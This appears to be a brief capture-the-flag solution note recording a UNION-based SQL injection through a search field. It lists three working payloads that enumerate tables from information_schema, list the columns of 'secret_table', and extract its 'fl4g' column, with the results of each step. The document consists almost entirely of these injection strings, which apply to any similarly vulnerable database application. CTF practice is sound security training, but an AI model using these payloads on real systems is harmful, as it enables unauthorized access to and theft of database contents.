* show all table in this database
	search: ' union select null, table_name, null from information_schema.tables #	
	=> find 'secret_table'

* find name column of 'secret_table'
	search: ' union select null, column_name, null from information_schema.columns where table_name='secret_table' #
	=> 2 columns: id, fl4g
	
* select content of table:
	search: ' union select null, fl4g, null from secret_table #
